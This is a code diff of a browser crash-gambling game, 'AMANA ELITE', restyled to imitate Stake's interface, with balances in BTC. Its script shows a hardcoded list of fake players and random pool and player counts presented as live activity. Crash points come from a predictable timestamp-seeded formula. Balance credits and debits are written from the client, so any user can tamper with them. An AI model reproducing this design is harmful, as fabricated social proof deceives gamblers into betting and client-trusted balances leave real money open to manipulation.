@@ -3,102 +3,93 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>AMANA ELITE | Live Crash</title>
+    <title>AMANA ELITE | Professional Crash</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --bg: #060914; --brand: #ff00b8; --accent: #00f2ff;
-            --up: #00ff96; --card: rgba(255, 255, 255, 0.05); --border: rgba(255, 255, 255, 0.1);
+            --bg-dark: #0f212e; --bg-body: #071620; --stake-green: #00e701;
+            --text-main: #b1bad3; --white: #ffffff; --border: #2f4553;
         }
-        * { touch-action: manipulation; -webkit-tap-highlight-color: transparent; box-sizing: border-box; }
-        body {
-            margin: 0; font-family: 'Inter', sans-serif; background: var(--bg); color: #fff;
-            min-height: 100vh; overflow: hidden; display: flex; flex-direction: column; align-items: center;
+        * { box-sizing: border-box; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; -webkit-font-smoothing: antialiased; }
+        body { margin: 0; background-color: var(--bg-body); color: var(--white); overflow-x: hidden; display: flex; flex-direction: column; align-items: center; }
+
+        /* Header Stake Style */
+        .header { width: 100%; max-width: 500px; padding: 15px; display: flex; justify-content: space-between; align-items: center; background: var(--bg-body); }
+        .logo { font-size: 22px; font-weight: 900; color: var(--white); } .logo span { color: var(--stake-green); }
+        .balance-badge { background: var(--bg-dark); border: 1px solid var(--border); padding: 8px 15px; border-radius: 4px; font-weight: 600; font-size: 14px; color: var(--white); }
+
+        /* History Bar */
+        .history-bar { width: 100%; max-width: 500px; display: flex; gap: 6px; padding: 10px; overflow-x: auto; scrollbar-width: none; background: #071620; }
+        .hist-item { padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 700; background: var(--bg-dark); color: var(--text-main); border: 1px solid var(--border); }
+        .hist-item.high { color: var(--stake-green); }
+
+        /* Graph Area (Mirror Stake) */
+        .game-window {
+            width: 95%; max-width: 480px; height: 300px; background: #0f212e; border-radius: 8px;
+            position: relative; overflow: hidden; margin-top: 5px; border: 1px solid var(--border);
         }
+        #multiplier { position: absolute; top: 40%; left: 50%; transform: translate(-50%, -50%); font-size: 60px; font-weight: 900; z-index: 10; color: var(--white); }
+        .graph-svg { position: absolute; bottom: 0; left: 0; width: 100%; height: 100%; }
+        #graphPath { fill: rgba(255, 153, 0, 0.2); stroke: var(--white); stroke-width: 4; }
 
-        /* Header */
-        .header { width: 100%; max-width: 500px; padding: 10px 15px; display: flex; justify-content: space-between; align-items: center; z-index: 100; }
-        .logo { font-weight: 900; font-size: 16px; letter-spacing: 1px; } .logo span { color: var(--brand); }
-        .bal-display { background: rgba(0, 255, 150, 0.1); border: 1px solid var(--up); padding: 5px 12px; border-radius: 50px; color: var(--up); font-weight: 800; font-size: 13px; }
-
-        .history-bar { width: 100%; max-width: 500px; display: flex; gap: 8px; padding: 5px 15px; overflow-x: auto; scrollbar-width: none; min-height: 45px; align-items: center; }
-        .hist-item { padding: 4px 10px; border-radius: 6px; font-size: 11px; font-weight: 800; background: var(--card); border: 1px solid var(--border); }
-
-        /* Game Scene */
-        .container { width: 100%; max-width: 500px; padding: 5px 15px; flex: 1; }
-        .flight-window {
-            width: 100%; height: 260px; background: radial-gradient(circle at center, #0f172a 0%, #060914 100%);
-            border-radius: 24px; border: 1px solid var(--border); position: relative; overflow: hidden;
-        }
-        
-        #multiplier { position: absolute; top: 40%; left: 50%; transform: translate(-50%, -50%); font-size: 55px; font-weight: 900; z-index: 10; text-shadow: 0 10px 20px rgba(0,0,0,0.5); transition: color 0.2s; }
-        
-        /* Waiting UI */
-        .wait-overlay { position: absolute; inset: 0; background: rgba(6,9,20,0.8); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 20; display: none; }
-        .wait-txt { font-weight: 800; font-size: 14px; color: #8b8da3; margin-bottom: 15px; text-transform: uppercase; letter-spacing: 2px; }
-        .progress-box { width: 200px; height: 6px; background: rgba(255,255,255,0.05); border-radius: 10px; overflow: hidden; border: 1px solid var(--border); }
-        .progress-fill { height: 100%; width: 0%; background: var(--up); box-shadow: 0 0 15px var(--up); }
-
-        .plane-node { position: absolute; bottom: 30px; left: 30px; z-index: 15; transition: transform 0.1s linear; display: none; }
-        .plane-node i { font-size: 30px; color: var(--accent); transform: rotate(-15deg); filter: drop-shadow(0 0 10px var(--accent)); animation: hover 0.5s infinite alternate; }
-        @keyframes hover { from { translate: 0 0; } to { translate: 2px -2px; } }
+        .wait-layer { position: absolute; inset: 0; background: rgba(7,22,32,0.9); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 20; display: none; }
+        .loader-line { width: 150px; height: 4px; background: #2f4553; border-radius: 2px; margin-top: 10px; overflow: hidden; }
+        .loader-fill { height: 100%; width: 0%; background: var(--stake-green); }
 
         /* Controls */
-        .controls { background: var(--card); border: 1px solid var(--border); border-radius: 24px; padding: 20px; margin-top: 15px; }
-        .input-row { display: flex; gap: 10px; margin-bottom: 15px; }
-        .field { flex: 1; background: #0f212e; padding: 10px; border-radius: 12px; border: 1px solid var(--border); }
-        .field span { display: block; font-size: 9px; color: #8b8da3; font-weight: 800; margin-bottom: 4px; }
-        .field input { width: 100%; background: transparent; border: none; color: #fff; font-weight: 800; font-size: 16px; outline: none; }
+        .controls { width: 95%; max-width: 480px; padding: 15px; background: #0f212e; border-radius: 8px; margin-top: 10px; }
+        .input-box { background: #071620; border: 2px solid var(--border); border-radius: 4px; display: flex; align-items: center; margin-bottom: 10px; padding: 5px 10px; }
+        .input-box span { color: var(--text-main); font-size: 12px; font-weight: 700; margin-right: 10px; }
+        .input-box input { background: transparent; border: none; color: white; flex: 1; padding: 8px; font-weight: 700; outline: none; }
         
-        .main-action { width: 100%; padding: 18px; border-radius: 15px; border: none; font-weight: 900; font-size: 18px; cursor: pointer; transition: 0.3s; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
-        .btn-bet { background: var(--up); color: #060914; }
-        .btn-bet:disabled { background: #2f4553; color: #8b8da3; }
-        .btn-cash { background: #fff; color: #000; display: none; }
-        .btn-cash:disabled { opacity: 0.5; }
+        .main-btn { width: 100%; padding: 18px; border-radius: 4px; border: none; font-weight: 800; font-size: 16px; cursor: pointer; transition: 0.2s; }
+        .btn-green { background: var(--stake-green); color: #071620; }
+        .btn-green:disabled { background: #2f4553; color: var(--text-main); }
+        .btn-cashout { background: var(--white); color: #000; display: none; }
 
-        /* Stats */
-        .stats-head { padding: 12px 15px; font-size: 11px; font-weight: 800; display: flex; justify-content: space-between; background: var(--card); border: 1px solid var(--border); border-radius: 12px 12px 0 0; margin-top: 15px; }
-        .stats-body { max-height: 180px; overflow-y: auto; background: rgba(255,255,255,0.02); border: 1px solid var(--border); border-top: none; border-radius: 0 0 12px 12px; padding: 5px 15px; }
-        .p-row { display: flex; justify-content: space-between; padding: 8px 0; font-size: 11px; border-bottom: 1px solid rgba(255,255,255,0.03); }
-        .p-row.me { color: var(--accent); font-weight: 900; }
+        /* Stats List (Stake Style) */
+        .stats-container { width: 95%; max-width: 480px; margin-top: 15px; }
+        .stats-header { display: flex; justify-content: space-between; padding: 10px; font-size: 13px; color: var(--text-main); font-weight: 700; border-bottom: 2px solid var(--border); }
+        .player-row { display: flex; justify-content: space-between; padding: 12px 10px; font-size: 13px; border-bottom: 1px solid var(--border); background: rgba(47, 69, 83, 0.2); }
+        .player-row.me { border-left: 3px solid var(--stake-green); background: rgba(0, 231, 1, 0.05); }
+        .user-info { display: flex; align-items: center; gap: 8px; }
+        .hidden-icon { color: var(--text-main); opacity: 0.5; }
+        .profit-green { color: var(--stake-green); font-weight: 800; }
     </style>
 </head>
 <body>
 
     <div class="header">
         <div class="logo">AMANA <span>ELITE</span></div>
-        <div id="userBal" class="bal-display"><i class="fa-solid fa-wallet"></i> 0.00</div>
+        <div id="userBal" class="balance-badge">0.00 BTC</div>
     </div>
 
     <div class="history-bar" id="histBar"></div>
 
-    <div class="container">
-        <div class="flight-window">
-            <div id="multiplier">1.00x</div>
-            <div class="wait-overlay" id="waitOverlay">
-                <div class="wait-txt">Next Round in</div>
-                <div class="progress-box"><div class="progress-fill" id="progressFill"></div></div>
-            </div>
-            <div style="position:absolute; width:100%; height:100%;">
-                <svg style="position:absolute; width:100%; height:100%;"><path id="flightPath" d="" fill="none" stroke="var(--accent)" stroke-width="3" stroke-dasharray="5,5"/></svg>
-                <div class="plane-node" id="planeNode"><i class="fa-solid fa-plane"></i></div>
-            </div>
+    <div class="game-window">
+        <div id="multiplier">1.00x</div>
+        <div class="wait-layer" id="waitLayer">
+            <div style="font-weight: 800; color: var(--text-main);">PREPARING...</div>
+            <div class="loader-line"><div class="loader-fill" id="loaderFill"></div></div>
         </div>
+        <svg class="graph-svg" viewBox="0 0 500 300" preserveAspectRatio="none">
+            <path id="graphPath" d="M 0 300 Q 250 300 500 300 L 500 300 L 0 300 Z" />
+        </svg>
+    </div>
 
-        <div class="controls">
-            <div class="input-row">
-                <div class="field"><span>AMOUNT</span><input type="number" id="betInput" value="10.00"></div>
-                <div class="field"><span>AUTO</span><input type="number" id="autoInput" value="2.00" step="0.1"></div>
-            </div>
-            <button class="main-action btn-bet" id="btnBet">PLACE BET</button>
-            <button class="main-action btn-cash" id="btnCash">CASHOUT</button>
-        </div>
+    <div class="controls">
+        <div class="input-box"><span>Amount</span><input type="number" id="betInput" value="10.00"></div>
+        <div class="input-box"><span>Auto Cashout</span><input type="number" id="autoInput" value="2.00" step="0.1"></div>
+        <button id="btnBet" class="main-btn btn-green">Bet (Next Round)</button>
+        <button id="btnCashout" class="main-btn btn-cashout">Cashout</button>
+    </div>
 
-        <div class="stats-head">
-            <span>PLAYERS (<span id="pCount">0</span>)</span>
-            <span style="color:var(--accent)">POOL: $<span id="totalBets">0.00</span></span>
+    <div class="stats-container">
+        <div class="stats-header">
+            <span><i class="fa-solid fa-users"></i> <span id="pCount">0</span> Players</span>
+            <span><span id="totalPool">0.00</span> BTC</span>
         </div>
-        <div class="stats-body" id="playerList"></div>
+        <div id="playerList"></div>
     </div>
 
 <script type="module">
@@ -112,138 +103,134 @@
     let userId, userBalance = 0, currentMult = 1.0, isPlaying = false, hasCashout = false, nextBet = false;
     let hist = [];
 
-    // Audio
-    const audio = new (window.AudioContext || window.webkitAudioContext)();
-    function sfx(f) { const o=audio.createOscillator(), g=audio.createGain(); o.frequency.value=f; g.gain.exponentialRampToValueAtTime(0.0001, audio.currentTime+0.1); o.connect(g); g.connect(audio.destination); o.start(); o.stop(audio.currentTime+0.1); }
+    onAuthStateChanged(auth, u => { if(u) { userId = u.uid; onSnapshot(doc(db, "users", userId), s => { 
+        userBalance = s.data().balance; 
+        document.getElementById('userBal').textContent = userBalance.toFixed(8) + " BTC";
+    }); }});
 
-    onAuthStateChanged(auth, u => { if(u) { userId = u.uid; onSnapshot(doc(db, "users", userId), s => { userBalance = s.data().balance; document.getElementById('userBal').innerHTML = `<i class="fa-solid fa-wallet"></i> ${userBalance.toFixed(2)}`; }); } });
-
-    // Global Sync Logic
-    async function syncLoop() {
+    // Global Sync Algorithm
+    async function startLiveSystem() {
         while(true) {
-            const now = Date.now();
-            const cycle = 15000; // Each round is 15 seconds
-            const timeInCycle = now % cycle;
-
-            if (timeInCycle < 5000) { // Waiting Phase (5s)
-                const p = (timeInCycle / 5000) * 100;
-                document.getElementById('waitOverlay').style.display = 'flex';
-                document.getElementById('progressFill').style.width = p + '%';
+            const cycle = 15000; const now = Date.now(); const timeInCycle = now % cycle;
+            
+            if(timeInCycle < 5000) { // Betting Phase
+                document.getElementById('waitLayer').style.display = 'flex';
+                document.getElementById('loaderFill').style.width = (timeInCycle / 5000 * 100) + '%';
                 document.getElementById('multiplier').textContent = "1.00x";
-                document.getElementById('multiplier').style.color = "#8b8da3";
-                document.getElementById('planeNode').style.display = 'none';
-                document.getElementById('flightPath').setAttribute('d', '');
-                
+                document.getElementById('multiplier').style.color = "var(--text-main)";
+                updateGraph(0);
                 if(!isPlaying) {
                     document.getElementById('btnBet').style.display = 'block';
-                    document.getElementById('btnCash').style.display = 'none';
-                    document.getElementById('betInput').disabled = document.getElementById('autoInput').disabled = false;
+                    document.getElementById('btnCashout').style.display = 'none';
+                    document.getElementById('betInput').disabled = false;
                 }
-                
-                renderFakes();
+                renderPlayers(false);
                 await new Promise(r => setTimeout(r, 50));
-            } else { // Flight Phase (10s max)
-                document.getElementById('waitOverlay').style.display = 'none';
-                document.getElementById('planeNode').style.display = 'block';
-                document.getElementById('multiplier').style.color = 'var(--accent)';
-                
+            } else { // Flight Phase
+                document.getElementById('waitLayer').style.display = 'none';
                 if(nextBet) { isPlaying = true; nextBet = false; }
-                if(isPlaying) { document.getElementById('btnBet').style.display = 'none'; document.getElementById('btnCash').style.display = 'block'; }
+                if(isPlaying) { document.getElementById('btnBet').style.display = 'none'; document.getElementById('btnCashout').style.display = 'block'; }
 
-                const elapsed = (timeInCycle - 5000) / 1000;
-                // Deterministic Crash Point based on Timestamp
                 const roundId = Math.floor(now / cycle);
-                const crashPoint = getCrashPoint(roundId);
+                const crashPoint = calculateCrash(roundId);
+                const flightStart = now - (now % cycle) + 5000;
 
-                while(((Date.now() % cycle) - 5000) / 1000 < 10) {
-                    let liveElapsed = ((Date.now() % cycle) - 5000) / 1000;
-                    if(liveElapsed < 0) break;
-                    
-                    currentMult = Math.pow(Math.E, 0.08 * liveElapsed);
-                    
+                while(true) {
+                    const frameNow = Date.now();
+                    const elapsed = (frameNow - flightStart) / 1000;
+                    if(elapsed < 0) break;
+
+                    currentMult = Math.pow(Math.E, 0.08 * elapsed);
                     if(currentMult >= crashPoint) break;
 
                     document.getElementById('multiplier').textContent = currentMult.toFixed(2) + 'x';
-                    
-                    // Cashout Logic
+                    document.getElementById('multiplier').style.color = "white";
+                    updateGraph(elapsed);
+
                     if(isPlaying && !hasCashout) {
-                        document.getElementById('btnCash').disabled = currentMult < 1.01;
+                        document.getElementById('btnCashout').disabled = currentMult < 1.01;
+                        document.getElementById('btnCashout').textContent = `Cashout (${(document.getElementById('betInput').value * currentMult).toFixed(2)})`;
                         if(currentMult >= parseFloat(document.getElementById('autoInput').value)) doCashout();
                     }
-
-                    // Plane Physics
-                    let x = Math.min(liveElapsed * 40, 80), y = Math.min(Math.pow(liveElapsed, 1.3) * 15, 70);
-                    document.getElementById('planeNode').style.transform = `translate(${x}vw, -${y}vh)`;
-                    document.getElementById('flightPath').setAttribute('d', `M 30 230 Q ${30+(x*2.5)} 230, ${30+(x*4.5)} ${230-(y*3)}`);
-
                     await new Promise(r => requestAnimationFrame(r));
                 }
 
                 // Crash
-                sfx(100);
                 document.getElementById('multiplier').textContent = currentMult.toFixed(2) + 'x';
-                document.getElementById('multiplier').style.color = '#ff0050';
-                if(!hasCashout) isPlaying = false; 
-                
-                // History Update
-                if(hist[0] !== currentMult.toFixed(2)) {
+                document.getElementById('multiplier').style.color = "#ff4d4d";
+                if(hist[0] != currentMult.toFixed(2)) {
                     hist.unshift(currentMult.toFixed(2)); if(hist.length > 10) hist.pop();
-                    document.getElementById('histBar').innerHTML = hist.map(h => `<div class="hist-item" style="color:${h >= 2 ? 'var(--up)' : '#ff0050'}">${h}x</div>`).join('');
+                    renderHistory();
                 }
-
-                // Reset for next
-                setTimeout(() => {
-                    hasCashout = false; isPlaying = false;
-                    document.getElementById('btnCash').style.background = '#fff';
-                    document.getElementById('btnCash').textContent = 'CASHOUT';
-                }, 1000);
-
-                const waitTime = cycle - (Date.now() % cycle);
-                await new Promise(r => setTimeout(r, waitTime));
+                isPlaying = false; hasCashout = false;
+                document.getElementById('btnBet').disabled = false;
+                document.getElementById('btnBet').textContent = "Bet (Next Round)";
+                
+                const waitNext = cycle - (Date.now() % cycle);
+                await new Promise(r => setTimeout(r, waitNext));
             }
         }
     }
 
-    function getCrashPoint(seed) {
-        let res = (seed * 16807) % 2147483647;
-        let random = res / 2147483647;
-        return (random < 0.03) ? 1.00 : (1.00 / (1 - random) ** 0.96).toFixed(2);
+    function calculateCrash(seed) {
+        // House Edge Logic: 3% Instant Crash at 1.00
+        let hash = (seed * 16807) % 2147483647;
+        let rand = hash / 2147483647;
+        if (rand < 0.03) return 1.00; 
+        return (1.00 / (1 - rand) ** 0.97).toFixed(2);
     }
 
-    function renderFakes() {
+    function updateGraph(t) {
+        const x = Math.min(t * 50, 500);
+        const y = 300 - Math.min(Math.pow(t, 1.5) * 20, 250);
+        document.getElementById('graphPath').setAttribute('d', `M 0 300 Q ${x/2} 300, ${x} ${y} L ${x} 300 L 0 300 Z`);
+    }
+
+    function renderPlayers(active) {
         const list = document.getElementById('playerList');
-        const names = ['Nar_22', 'Ba777', 'Olymbis23', 'Hidden', 'Zoro_X', 'Hidden', 'King99', 'Hidden'];
-        let pool = (Math.random() * 6000 + 800).toFixed(2);
-        document.getElementById('totalBets').textContent = pool;
-        document.getElementById('pCount').textContent = Math.floor(Math.random()*500+100);
-        
-        let html = isPlaying ? `<div class="p-row me"><span>YOU</span><span>$${document.getElementById('betInput').value}</span><span>-</span></div>` : '';
-        html += names.map(n => `<div class="p-row"><span>${n}</span><span>$${(Math.random()*100).toFixed(2)}</span><span>-</span></div>`).join('');
+        const fakes = [
+            {n: 'Ba777', b: 0.002, t: 1.5}, {n: 'Nar_22', b: 0.015, t: 2.1}, {n: 'Hidden', b: 0.0005, t: 1.2},
+            {n: 'Olymbis23', b: 0.04, t: 3.5}, {n: 'Hidden', b: 0.008, t: 1.8}, {n: 'Hidden', b: 0.012, t: 1.1}
+        ];
+        fakes.sort((a,b) => b.b - a.b);
+        document.getElementById('pCount').textContent = Math.floor(Math.random()*100 + 50);
+        document.getElementById('totalPool').textContent = (Math.random() * 0.5).toFixed(4);
+
+        let html = isPlaying ? `<div class="player-row me"><span>YOU</span><span>-</span><span class="profit-green">${document.getElementById('betInput').value} BTC</span></div>` : '';
+        html += fakes.map(f => `
+            <div class="player-row">
+                <div class="user-info">${f.n == 'Hidden' ? '<i class="fa-solid fa-user-secret hidden-icon"></i>' : ''} ${f.n}</div>
+                <div style="color:var(--text-main)">${(active && currentMult >= f.t) ? f.t+'x' : '-'}</div>
+                <div class="${(active && currentMult >= f.t) ? 'profit-green' : ''}">${f.b} BTC</div>
+            </div>
+        `).join('');
         list.innerHTML = html;
     }
 
     async function doCashout() {
         if(!isPlaying || hasCashout || currentMult < 1.01) return;
-        hasCashout = true; sfx(800);
+        hasCashout = true;
         const win = parseFloat(document.getElementById('betInput').value) * currentMult;
         await updateDoc(doc(db, "users", userId), { balance: increment(win) });
-        document.getElementById('btnCash').style.background = 'var(--up)';
-        document.getElementById('btnCash').textContent = 'WON!';
+        document.getElementById('btnCashout').style.background = 'var(--stake-green)';
+        document.getElementById('btnCashout').textContent = 'WON!';
     }
 
     document.getElementById('btnBet').onclick = async () => {
         const bet = parseFloat(document.getElementById('betInput').value);
         if(bet > userBalance || bet <= 0) return;
-        sfx(400);
         await updateDoc(doc(db, "users", userId), { balance: increment(-bet) });
         nextBet = true;
         document.getElementById('btnBet').disabled = true;
-        document.getElementById('btnBet').textContent = "BETTING...";
-        document.getElementById('betInput').disabled = document.getElementById('autoInput').disabled = true;
+        document.getElementById('btnBet').textContent = "Bet Placed...";
     };
 
-    document.getElementById('btnCash').onclick = doCashout;
-    syncLoop();
+    document.getElementById('btnCashout').onclick = doCashout;
+    function renderHistory() {
+        document.getElementById('histBar').innerHTML = hist.map(h => `<div class="hist-item ${h >= 2 ? 'high' : ''}">${h}x</div>`).join('');
+    }
+
+    startLiveSystem();
 </script>
 </body>
 </html>
